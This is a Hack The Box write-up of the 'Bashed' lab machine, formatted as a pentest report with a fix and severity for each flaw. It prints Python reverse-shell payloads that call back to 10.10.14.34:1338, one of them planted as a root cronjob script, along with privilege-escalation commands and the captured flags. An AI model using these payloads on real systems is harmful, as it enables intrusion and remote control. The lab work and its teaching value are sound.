@@ -1,0 +1,346 @@
+#+TITLE: HTB - Bashed
+#+AUTHOR: Leonardo Tamiano
+
+* Summary
+
+** Author
+   The report was written by ~Leonardo Tamiano~ for his youtube channel ~hexdump~.
+
+   https://www.youtube.com/@hexdump1337
+   
+** Scope
+   In this report we analyze the security of ~bashed~, an Hack The Boox,
+   root2boot machine.
+
+   - *Name*: Bashed
+   - *Difficulty*: Easy
+   - *Operating System*: Linux/Ubuntu
+   - *IP*: 10.10.10.68
+
+** High-Level Overview
+   The machine presented various critical vulnerabilities, which have
+   to be fixed as soon as possible. By abusing these vulnerabilities
+   we were able to obtain *root code execution* starting from nothing.
+
+   Some keypoints:
+
+   - Web servers should not expose directory indexes without proper
+     authentication.
+     
+   - Critical assets and code should not be kept in publicly accessible
+     resouces.
+
+   - Permissions and configurations require more hardening.
+
+   - The ~/proc~ filesystem is not protected enough
+
+** Tools
+   The tools used in order to complete the machien are shown below:
+
+   - ~nmap~, to analyze UDP/TCP ports
+   - ~gobuster~, to enumerate HTTP resources
+   - ~python~, to spawn reverse shells
+   - ~pspy64~, to enumerate cronjobs
+
+   The only tool that is not instaleld by default in typical
+   penetration testing oriented distributions is ~pspy64~, which can be
+   found in the following github repository
+
+   https://github.com/DominicBreuker/pspy
+
+* Foothold (kali -> www-data)
+  Enumerating the surface area with ~nmap~ we see an open port exposing
+  an ~http~ server.
+
+  *nmap -p- bashed*
+
+  #+begin_example
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-19 07:59 EST
+Nmap scan report for bashed (10.10.10.68)
+Host is up (0.047s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds 
+  #+end_example
+
+  With a more specific scan we're able to recognize that the web
+  server is running an ~Apache httpd 2.4.18~ within an ~ubuntu~ server.
+  
+  *nmap -sC -sV bashed*
+  
+  #+begin_example
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Arrexel's Development Site
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+  #+end_example
+
+  By enumerating the webserver with ~gobuster~ we're able to see ~php~
+  files, signaling that the application is running php code. We also
+  enumerate a bunch of different directories.
+
+  #+begin_src bash
+gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bashed -x php
+  #+end_src
+
+  #+begin_example
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://bashed
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2023/12/19 08:11:39 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 301] [--> http://bashed/images/]
+/.php                 (Status: 403) [Size: 285]
+/uploads              (Status: 301) [Size: 302] [--> http://bashed/uploads/]
+/php                  (Status: 301) [Size: 298] [--> http://bashed/php/]
+/css                  (Status: 301) [Size: 298] [--> http://bashed/css/]
+/dev                  (Status: 301) [Size: 298] [--> http://bashed/dev/]
+/js                   (Status: 301) [Size: 297] [--> http://bashed/js/]
+/config.php           (Status: 200) [Size: 0]   
+  #+end_example
+
+  If we click on a directory such as ~/dev~ we're able to see the index
+  of the directory.
+
+  -----------------------------
+
+  *Vulnerability*: Directory indexes are exposed by the webserver. This
+  allows anyone to simply look at all the files present within any
+  publicly accessible directory.
+
+  *Fix*: The server configuration must be changed in order to not allow
+  any of the directory indexes to be exposed without proper
+  authentication.
+
+  *Severity*: Medium
+
+  *PoC*: Simply go to http://bashed/dev and you can see all the files.
+
+  *Screenshot*
+
+  [[./img/bashed-1.png]]
+
+  -----------------------------
+
+  Within the ~/dev/~ folder see the ~phpbash.php~ file. If we click on it
+  we will obtain a webshell on the target. By definition, this
+  webshell allows us to execute code on the remote target, thus
+  obtaining an RCE.
+
+  -----------------------------
+
+  *Vulnerability*: Critical assets (~phpbash.php~, ~phpbash.min.php~) are
+  present on http://bashed/dev folder, which can be used by anyone to
+  obtain an RCE.
+
+  *Fix*: Remove the critical assets as soon as possible, or make them
+  not publicly accessible by anyone.
+
+  *Severity*: Critical
+
+  *PoC*: Simply go to http://bashed/dev/phpbash.php
+
+  *Screenshot*
+
+  [[./img/bashed-2.png]]
+
+  -----------------------------  
+  
+* Pivoting (www-data -> scriptmanager)
+  Once inside as ~www-data~, by checking the ~sudoers~ subsystem we see
+  the following
+
+  *sudo -l*
+
+  #+begin_example
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+  #+end_example
+
+  With this configuration we're able to pivot into the ~scriptmanager~
+  account as we can execute any command as scriptmanager without any
+  password required.
+
+  -----------------------------
+
+  *Vulnerability*: Sudoers allows ~www-data~ user to easily pivot to
+  ~scriptmanager~ without proper authorization.
+
+  *Fix*: Change the sudoers configuration in order to enforce proper
+  authorization.
+
+  *Severity*: Critical
+
+  *PoC*:
+
+  #+begin_src bash
+sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
+  #+end_src
+
+
+  *Screenshot*
+
+  [[./img/bashed-3.png]]
+
+  -----------------------------
+
+  To actually pivot into the ~scriptmanager~ account, first we spawn a
+  reverse shell on the remote target using the previously found
+  webshell. To do this we can use the following payload, just change
+  IP/PORT as needed
+
+  #+begin_src python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.34",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  #+end_src
+
+  Once we have a property ~tty~ on the remote target as the user
+  ~www-data~ we execute the following in order to pivot into the
+  ~scriptmanager~ account
+
+  #+begin_src bash
+sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
+  #+end_src
+  
+* Privilege Escalation (scriptmanager -> root)
+  By using ~pspy64~ we're able to enumerate currently executing
+  processes.
+
+  #+begin_example
+2023/12/19 05:46:01 CMD: UID=0     PID=1469   | python test.py 
+2023/12/19 05:47:01 CMD: UID=0     PID=1475   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
+  #+end_example
+
+  and in particular we're able to understand that the ~root~ user is
+  executing the following ~bash~ code every minute
+
+  #+begin_src bash
+cd /scripts;
+for f in *.py; do python "$f"; done 
+  #+end_src
+
+  This means taht all scripts found within ~/scripts~ are executed by
+  the root account every minute.
+
+  -----------------------------
+  
+  *Vulnerability*: The ~/proc~ filesystem exposes information regarding
+  the processes of all users running on the machine.
+
+  *Fix*: Use the ~hidepid~ option when mounting the ~/proc~ filesystem in
+  order to hide such information
+
+  #+begin_src bash
+mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2 /proc
+  #+end_src
+
+  *Severity*: Medium
+
+  *PoC*:
+
+  #+begin_src bash
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+chmod +x pspy64
+./pspy64
+  #+end_src
+
+  *Screenshot*: [[img/bashed-4.png]]
+  
+  -----------------------------
+
+  By checking the ~/scripts~ folder, we also notice that we have full
+  control over the folder as the ~scriptmanager~ account.
+
+  *ls /*
+
+  #+begin_example
+...
+drwxr-xr-x  18 root          root           500 Dec 19 04:34 run
+drwxr-xr-x   2 root          root          4.0K Dec  4  2017 sbin
+drwxrwxr--   2 scriptmanager scriptmanager 4.0K Jun  2  2022 scripts
+drwxr-xr-x   2 root          root          4.0K Feb 15  2017 srv
+dr-xr-xr-x  13 root          root             0 Dec 19 05:22 sys
+...
+  #+end_example
+  
+
+  -----------------------------
+  
+  *Vulnerability*: Low privileged user (~scriptmanager~) has permission to
+  modify or introduce code within the ~/scripts~ folder that is then run
+  by high privileged user (~root~), causing a privilege escalation.
+
+  *Fix*: Change permission so that files within the ~/scripts~ folder can
+  onl be read by high privileged users
+
+  #+begin_src bash
+chown root:root /scripts
+chmod 755 /scripts
+  #+end_src
+
+  *Severity*: Critical
+
+  *PoC*:
+
+  #+begin_src bash
+cd /scripts
+echo "hi" > test
+cat test
+  #+end_src
+
+  *Screenshot*:
+
+  [[./img/bashed-5.png]]
+  
+  -----------------------------
+
+  To abuse this configuration we can introduce a malicious ~test.py~
+  script which contains a reverse shell in ~python~. We can then wait
+  for the next cronjob execution, which happens every minute, and
+  obtain our shell as root
+
+  *test.py*
+
+  #+begin_src python
+import socket,subprocess,os;
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.34",1338));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+  #+end_src
+  
+  [[./img/bashed-6.png]]
+
+  And this ends the machine and the report.
+  
+* Loot
+  The flags obtained during the activity are shown below
+
+  - *user flag*
+
+    #+begin_quote
+649f11e6ed4c6e33405ba65634431031
+    #+end_quote
+
+  - *root flag*
+
+    #+begin_quote
+f362a833d804058d4b640a32b92c14fd
+    #+end_quote
